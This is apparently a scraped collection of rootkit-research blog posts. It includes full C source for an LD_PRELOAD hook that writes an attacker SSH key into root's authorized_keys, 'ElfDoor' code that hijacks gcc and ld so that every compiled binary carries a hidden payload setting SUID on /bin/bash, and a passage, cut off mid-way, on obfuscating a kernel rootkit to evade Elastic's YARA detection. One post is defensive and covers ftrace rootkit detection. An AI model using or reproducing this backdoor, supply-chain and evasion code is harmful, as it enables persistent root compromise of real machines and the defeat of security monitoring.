{ if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, \u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], \u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); free(new_argv); return result; } } return real_posix_spawn(pid, path, file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":" Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \u0026#34;license=GPL\u0026#34; Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let\u0026rsquo;s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic\u0026rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \u0026#34;rootkit\u0026#34; $rk2 = \u0026#34;hide_\u0026#34; $rk3 = \u0026#34;hacked_\u0026#34; $rk4 = \u0026#34;fake_\u0026#34; $rk5 = \u0026#34;hooked_\u0026#34; $hook1 = \u0026#34;_getdents\u0026#34; $hook2 = \u0026#34;_kill\u0026#34; $hook3 = \u0026#34;_tcp4_seq_show\u0026#34; The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Generates random name that avoids YARA patterns\u0026#34;\u0026#34;\u0026#34; # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = [\u0026#39;sys\u0026#39;, \u0026#39;kern\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;mm\u0026#39;, \u0026#39;fs\u0026#39;, \u0026#39;net\u0026#39;, \u0026#39;proc\u0026#39;, \u0026#39;sched\u0026#39;] suffixes = [\u0026#39;handler\u0026#39;, \u0026#39;helper\u0026#39;, \u0026#39;worker\u0026#39;, \u0026#39;ops\u0026#39;, \u0026#39;func\u0026#39;, \u0026#39;entry\u0026#39;, \u0026#39;cb\u0026#39;] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\u0026#34;{prefix}_{middle}_{suffix}\u0026#34; Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u0026gt; Set[str]: \u0026#34;\u0026#34;\u0026#34;Names from kernel that should NOT be changed\u0026#34;\u0026#34;\u0026#34; return { # Basic C types \u0026#39;int\u0026#39;, \u0026#39;void\u0026#39;, \u0026#39;long\u0026#39;, \u0026#39;char\u0026#39;, \u0026#39;size_t\u0026#39;, \u0026#39;ssize_t\u0026#39;, # Essentials \u0026#39;module_init\u0026#39;, \u0026#39;module_exit\u0026#39;, \u0026#39;THIS_MODULE\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;kmalloc\u0026#39;, \u0026#39;kfree\u0026#39;, \u0026#39;printk\u0026#39;, \u0026#39;pr_debug\u0026#39;, \u0026#39;copy_from_user\u0026#39;, \u0026#39;copy_to_user\u0026#39;, \u0026#39;fget\u0026#39;, \u0026#39;fput\u0026#39;, \u0026#39;kernel_read\u0026#39;, # Structures \u0026#39;pt_regs\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;task_struct\u0026#39;, \u0026#39;sk_buff\u0026#39;, # Entry points \u0026#39;main\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;exit\u0026#39;, } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ 